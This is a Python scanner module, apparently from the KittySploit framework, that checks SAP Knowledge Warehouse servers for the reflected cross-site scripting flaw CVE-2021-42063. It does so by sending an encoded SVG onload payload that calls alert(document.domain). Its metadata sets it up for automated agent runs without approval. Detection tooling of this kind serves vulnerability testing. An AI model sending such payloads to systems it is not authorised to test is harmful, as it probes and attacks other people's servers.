#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SAP Knowledge Warehouse 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SAP Knowledge Warehouse <=7.5.0 - Cross-Site Scripting Detection',
        'description': 'SAP Knowledge Warehouse 7.30, 7.31, 7.40, and 7.50 contain a reflected cross-site scripting vulnerability via the usage of one SAP KW component within a web browser.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'sap', 'xss', 'seclists', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2022/Mar/32',
            'https://packetstormsecurity.com/files/166369/SAP-Knowledge-Warehouse-7.50-7.40-7.31-7.30-Cross-Site-Scripting.html',
            'https://twitter.com/MrTuxracer/status/1505934549217382409',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-42063',
            'http://packetstormsecurity.com/files/166369/SAP-Knowledge-Warehouse-7.50-7.40-7.31-7.30-Cross-Site-Scripting.html',
        ],
        'cve': 'CVE-2021-42063',
    }

    def run(self):
        r = self.http_request(method="GET", path='/SAPIrExtHelp/random/SAPIrExtHelp/random/%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<SVG ONLOAD=&#97&#108&#101&#114&#116(&#X64&#X6F&#X63&#X75&#X6D&#X65&#X6E&#X74&#X2E&#X64&#X6F&#X6D&#X61&#X69&#X6E)>', 'SAPIKS2',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="SAP Knowledge Warehouse <=7.5.0 - Cross-Site Scripting detected",
                path='/SAPIrExtHelp/random/SAPIrExtHelp/random/%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp',
            )
            return True
        return False

